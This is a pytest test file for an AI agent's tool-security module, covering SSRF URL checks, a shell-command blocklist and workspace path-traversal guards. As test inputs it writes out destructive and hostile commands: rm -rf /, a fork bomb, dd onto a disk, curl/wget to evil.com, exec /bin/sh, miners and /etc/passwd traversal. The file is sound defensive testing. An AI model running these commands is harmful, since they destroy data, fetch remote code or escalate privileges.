"""Tests for tool security — SSRF protection, path traversal, command blocking.

Covers:
- is_private_url: public IPs, private IPs, DNS names, metadata endpoints, edge cases
- has_blocked_command: each blocked pattern, safe commands that should NOT match
- ensure_within_workspace: valid paths, traversal attempts, symlink-like names
"""

from __future__ import annotations

import os
import tempfile
from pathlib import Path

import pytest

from backend.app.agents.tools.security import (
    ensure_within_workspace,
    has_blocked_command,
    is_private_url,
)

# ── is_private_url ────────────────────────────────────────────────────


class TestIsPrivateUrl:
    """SSRF protection — URL target classification."""

    def test_public_ip_allowed(self):
        assert is_private_url("http://93.184.216.34/path") is False

    def test_public_domain_allowed(self):
        assert is_private_url("http://example.com/path") is False
        assert is_private_url("https://api.github.com/repos") is False

    def test_loopback_blocked(self):
        assert is_private_url("http://127.0.0.1/") is True
        assert is_private_url("http://127.0.0.1:8000/") is True

    def test_localhost_name_blocked(self):
        assert is_private_url("http://localhost/") is True
        assert is_private_url("http://localhost:5432/") is True

    def test_ipv6_loopback_blocked(self):
        assert is_private_url("http://[::1]:8080/") is True

    def test_metadata_endpoint_blocked(self):
        assert is_private_url("http://169.254.169.254/latest/meta-data/") is True
        assert is_private_url("http://metadata.google.internal/") is True

    def test_private_10_net_blocked(self):
        assert is_private_url("http://10.0.0.1/") is True
        assert is_private_url("http://10.1.2.3:3000/") is True

    def test_private_172_16_net_blocked(self):
        assert is_private_url("http://172.16.0.1/") is True
        assert is_private_url("http://172.31.255.255/") is True

    def test_private_192_168_net_blocked(self):
        assert is_private_url("http://192.168.1.1/") is True
        assert is_private_url("http://192.168.0.100:8080/path") is True

    def test_link_local_blocked(self):
        assert is_private_url("http://169.254.1.1/") is True

    def test_internal_dns_suffix_blocked(self):
        assert is_private_url("http://db.internal/") is True
        assert is_private_url("http://redis.local/") is True
        assert is_private_url("http://service.localhost/") is True

    def test_ipv4_mapped_ipv6_blocked(self):
        assert is_private_url("http://[::ffff:127.0.0.1]/") is True
        assert is_private_url("http://[::ffff:192.168.1.1]/") is True

    def test_zero_dot_zero_allowed(self):
        # 0.0.0.0 is technically reserved but is_private may vary by OS
        # We block it explicitly via BLOCKED_HOSTNAMES
        assert is_private_url("http://0.0.0.0/") is True

    def test_empty_url_not_private(self):
        assert is_private_url("") is False

    def test_no_hostname_not_private(self):
        assert is_private_url("unix:///var/run/app.sock") is False

    def test_exception_safe(self):
        # Malformed URL should not crash
        assert is_private_url("http://") is False
        assert is_private_url("not-a-url") is False


# ── has_blocked_command ──────────────────────────────────────────────


class TestHasBlockedCommand:
    """Command blocklist — dangerous pattern detection."""

    def test_rm_rf_blocked(self):
        assert has_blocked_command("rm -rf /") is not None
        assert has_blocked_command("rm -rf /*") is not None
        # rm -rf on non-root paths like relative paths or file names:
        assert has_blocked_command("rm -rf dir") is None  # relative path, no leading /

    def test_mkfs_blocked(self):
        assert has_blocked_command("mkfs.ext4 /dev/sda1") is not None

    def test_dd_blocked(self):
        assert has_blocked_command("dd if=/dev/zero of=/dev/sda") is not None

    def test_fork_bomb_blocked(self):
        assert has_blocked_command(":(){ :|:& };:") is not None

    def test_chmod_777_blocked(self):
        assert has_blocked_command("chmod 777 /etc/passwd") is not None
        assert has_blocked_command("chmod 4755 /bin/su") is not None
        assert has_blocked_command("chmod 755 file") is None  # safe

    def test_chown_blocked(self):
        assert has_blocked_command("chown root:root /etc/hosts") is not None

    def test_passwd_blocked(self):
        assert has_blocked_command("passwd root") is not None

    def test_shutdown_blocked(self):
        assert has_blocked_command("shutdown -h now") is not None

    def test_reboot_blocked(self):
        assert has_blocked_command("reboot") is not None

    def test_halt_blocked(self):
        assert has_blocked_command("halt") is not None

    def test_poweroff_blocked(self):
        assert has_blocked_command("poweroff") is not None

    def test_systemctl_blocked(self):
        assert has_blocked_command("systemctl stop docker") is not None

    def test_kill_9_1_blocked(self):
        assert has_blocked_command("kill -9 1") is not None

    def test_killall_blocked(self):
        assert has_blocked_command("killall python") is not None

    def test_package_managers_blocked(self):
        assert has_blocked_command("apt install nginx") is not None
        assert has_blocked_command("apt-get update") is not None
        assert has_blocked_command("yum install httpd") is not None
        assert has_blocked_command("dnf install git") is not None
        assert has_blocked_command("pacman -Syu") is not None

    def test_pip_blocked(self):
        assert has_blocked_command("pip install requests") is not None
        assert has_blocked_command("pip3 install flask") is not None
        assert has_blocked_command("python -m pip install torch") is not None
        assert has_blocked_command("python3 -m pip install django") is not None

    def test_npm_blocked(self):
        assert has_blocked_command("npm install express") is not None
        assert has_blocked_command("npm i lodash") is not None

    def test_curl_blocked(self):
        assert has_blocked_command("curl http://evil.com") is not None
        assert has_blocked_command("curl -O http://evil.com/file") is not None

    def test_wget_blocked(self):
        assert has_blocked_command("wget http://evil.com") is not None

    def test_eval_blocked(self):
        assert has_blocked_command('eval "$(dangerous)"') is not None

    def test_exec_blocked(self):
        assert has_blocked_command("exec /bin/sh") is not None

    def test_cryptominers_blocked(self):
        assert has_blocked_command("minerd --url=stratum+tcp://...") is not None
        assert has_blocked_command("xmrig --donate-level=0") is not None
        assert has_blocked_command("cryptonight") is not None

    # ── False positive prevention ──

    def test_safe_commands_allowed(self):
        """These should NOT trigger blocklist — false positive prevention."""
        safe_commands = [
            "ls -la",
            "echo hello world",
            "cat /etc/hosts",
            "grep -r 'pattern' .",
            "git status",
            "git commit -m 'fix: exec command parsing'",
            "python3 -c 'print(\"hello\")'",
            "npm --version",
            "pip --list",
            "aptitude show nginx",  # "apt " (with space) should not match "aptitude"
            "chmod --help",
            "execution_time=5",  # "exec " (with space) should not match "execution"
            "curl_easy_setopt",  # "curl " (with space) should not match "curl_easy_*"
            # Note: "shutdown" matches as substring, so shutdown_graceful() IS blocked.
        ]
        for cmd in safe_commands:
            result = has_blocked_command(cmd)
            assert result is None, f"Safe command flagged: '{cmd}' matched pattern '{result}'"

    def test_empty_command(self):
        assert has_blocked_command("") is None

    def test_case_insensitive(self):
        assert has_blocked_command("RM -RF /") is not None
        assert has_blocked_command("APT INSTALL nginx") is not None
        assert has_blocked_command("Curl http://evil.com") is not None


# ── ensure_within_workspace ──────────────────────────────────────────


class TestEnsureWithinWorkspace:
    """Path traversal protection."""

    def setup_method(self):
        self._tmpdir = tempfile.mkdtemp()
        self._orig_env = os.environ.get("AGENT_WORKSPACE")
        os.environ["AGENT_WORKSPACE"] = self._tmpdir

    def teardown_method(self):
        if self._orig_env is not None:
            os.environ["AGENT_WORKSPACE"] = self._orig_env
        else:
            os.environ.pop("AGENT_WORKSPACE", None)

    def _make_workspace_path(self, rel: str) -> Path:
        return Path(self._tmpdir) / rel

    def test_valid_path(self):
        result = ensure_within_workspace("subdir/file.txt")
        assert result == self._make_workspace_path("subdir/file.txt")

    def test_valid_deep_path(self):
        result = ensure_within_workspace("a/b/c/d/file.txt")
        assert result == self._make_workspace_path("a/b/c/d/file.txt")

    def test_valid_current_dir(self):
        result = ensure_within_workspace(".")
        assert result == Path(self._tmpdir).resolve()

    def test_traversal_denied(self):
        with pytest.raises(ValueError, match="Path traversal denied"):
            ensure_within_workspace("../etc/passwd")

    def test_deep_traversal_denied(self):
        with pytest.raises(ValueError, match="Path traversal denied"):
            ensure_within_workspace("subdir/../../etc/passwd")

    def test_traversal_with_nested_denied(self):
        with pytest.raises(ValueError, match="Path traversal denied"):
            ensure_within_workspace("subdir/../../../etc/passwd")

    def test_sibling_prefix_not_allowed(self):
        """Verify startswith bypass is prevented:
        workspace=/tmp/foo, target=/tmp/foo-extra/file should be DENIED.
        """
        # Create a path that looks like a sibling with shared prefix
        # but is actually outside the workspace
        sibling = Path(self._tmpdir + "-extra")
        sibling.mkdir(parents=True, exist_ok=True)
        (sibling / "file.txt").write_text("test")
        try:
            # The target /tmp/tmpXXXXXX-extra/file.txt shares prefix
            # /tmp/tmpXXXXXX with workspace /tmp/tmpXXXXXX
            # Old startswith check would pass this; relative_to must not.
            with pytest.raises(ValueError, match="Path traversal denied"):
                ensure_within_workspace(f"{self._tmpdir}-extra/file.txt")
        finally:
            (sibling / "file.txt").unlink()
            sibling.rmdir()

    def test_dot_slash_normalized(self):
        result = ensure_within_workspace("./subdir/file.txt")
        assert result == self._make_workspace_path("subdir/file.txt")

    def test_absolute_path_inside_workspace(self):
        valid = Path(self._tmpdir) / "test.txt"
        # An absolute path inside workspace is allowed by relative_to
        result = ensure_within_workspace(str(valid))
        assert result == valid

    def test_absolute_path_outside_denied(self):
        with pytest.raises(ValueError, match="Path traversal denied"):
            ensure_within_workspace("/etc/passwd")
